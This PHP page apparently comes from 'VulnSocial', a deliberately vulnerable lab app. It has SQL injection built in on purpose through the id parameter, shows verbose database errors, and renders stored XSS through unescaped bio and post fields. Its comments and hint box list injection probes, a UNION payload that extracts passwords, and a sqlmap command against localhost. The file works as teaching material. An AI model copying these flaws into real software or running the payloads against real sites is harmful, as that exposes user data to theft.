<?php
// ===================================================
// profile.php
// VULNERABILITY 1: SQLi via ?id= parameter (PRIMARY TARGET for sqlmap)
// VULNERABILITY 2: Stored XSS via bio field
//
// SQLi Test:
//   profile.php?id=1'  → causes DB error (error-based detection)
//   profile.php?id=1 AND 1=1-- -  → normal result
//   profile.php?id=1 AND 1=2-- -  → empty result (boolean-based blind)
//
// sqlmap command:
//   sqlmap -u "http://localhost/vuln_social/profile.php?id=1" --dbs --batch
// ===================================================
require_once 'db.php';

if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit();
}

$current_user_id = $_SESSION['user_id'];

// ❌ VULNERABLE — ?id= directly into SQL query
$id = isset($_GET['id']) ? $_GET['id'] : $current_user_id;

// ❌ No intval(), no prepared statement
$query  = "SELECT * FROM users WHERE id = $id";
$result = mysqli_query($conn, $query);

if (!$result || mysqli_num_rows($result) === 0) {
    // Show DB error — helps attacker confirm injection
    echo "<div class='alert error'>User not found. Query: <code>$query</code><br>Error: " . mysqli_error($conn) . "</div>";
    // Uncomment for more verbose error (mysql_error style):
}

$profile = mysqli_fetch_assoc($result);

// Fetch user's posts
$posts_q  = "SELECT * FROM posts WHERE user_id = $id ORDER BY created_at DESC";
$posts_r  = mysqli_query($conn, $posts_q);
$posts    = [];
if ($posts_r) {
    while ($row = mysqli_fetch_assoc($posts_r)) {
        $posts[] = $row;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>VulnSocial — Profile</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
<nav class="navbar">
    <div class="nav-logo">🔓 VulnSocial</div>
    <div class="nav-links">
        <a href="feed.php">Home</a>
        <a href="profile.php?id=<?= $current_user_id ?>">My Profile</a>
        <a href="messages.php">Messages</a>
        <a href="settings.php">Settings</a>
        <a href="logout.php" class="btn-logout">Logout</a>
    </div>
</nav>

<div class="container">
    <?php if ($profile): ?>
    <div class="profile-header card">
        <div class="profile-avatar">👤</div>
        <div class="profile-info">
            <h2><?= $profile['username'] ?></h2>
            <p class="profile-email">📧 <?= $profile['email'] ?></p>
            <!-- ❌ Stored XSS — bio echoed raw -->
            <div class="profile-bio"><?= $profile['bio'] ?></div>
            <?php if ($profile['role'] === 'admin'): ?>
                <span class="badge-admin">⭐ Admin</span>
            <?php endif; ?>
        </div>
    </div>

    <div class="vuln-hint">
        <strong>🔴 SQLi Target URL:</strong><br>
        <code>profile.php?id=1</code> → Try <code>id=1'</code> for error<br>
        UNION: <code>?id=-1 UNION SELECT 1,username,password,email,bio,role FROM users LIMIT 1-- -</code><br>
        sqlmap: <code>sqlmap -u "http://localhost/vuln_social/profile.php?id=1" --dbs --batch</code>
    </div>

    <h3 class="section-title">Posts</h3>
    <?php foreach ($posts as $post): ?>
        <div class="card post-card">
            <!-- ❌ Stored XSS -->
            <div class="post-body"><?= $post['content'] ?></div>
            <div class="post-time"><?= $post['created_at'] ?></div>
        </div>
    <?php endforeach; ?>

    <?php else: ?>
        <div class="card"><p class="empty">Profile not found.</p></div>
    <?php endif; ?>
</div>
</body>
</html>
